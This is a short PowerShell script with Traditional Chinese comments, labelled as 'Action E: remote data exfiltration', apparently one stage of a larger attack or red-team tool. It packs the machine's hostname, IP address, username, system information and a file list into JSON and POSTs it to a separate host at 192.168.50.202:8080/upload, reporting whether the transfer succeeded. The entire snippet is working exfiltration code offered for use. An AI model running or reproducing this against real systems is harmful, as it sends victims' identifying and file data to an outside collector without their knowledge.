# --- 動作 E: 遠端數據滲漏 (Exfiltration) ---
# 確保變數有被正確定義
$destinationIP = "192.168.50.202" 
$port = "8080"
$url = "http://$($destinationIP):$($port)/upload"

Write-Host "[*] 正在嘗試連線至: $url" -ForegroundColor Cyan

# 打包資料
$jsonPayload = @{
    hostname = $env:COMPUTERNAME
    ip       = $ip
    user     = $env:USERNAME
    info     = $sysInfo
    files    = $fileList
} | ConvertTo-Json -Compress

try {
    # 使用完整的 $url 變數
    $response = Invoke-RestMethod -Uri $url `
                                  -Method Post `
                                  -Body $jsonPayload `
                                  -ContentType "application/json; charset=utf-8" `
                                  -TimeoutSec 10 `
                                  -UseBasicParsing
                                  
    Write-Host "[+] 數據回傳成功！" -ForegroundColor Green
} catch {
    Write-Host "[-] 回傳失敗。" -ForegroundColor Red
    Write-Host "[!] 錯誤詳情: $($_.Exception.Message)" -ForegroundColor Gray
}
Start-Sleep -Seconds 5
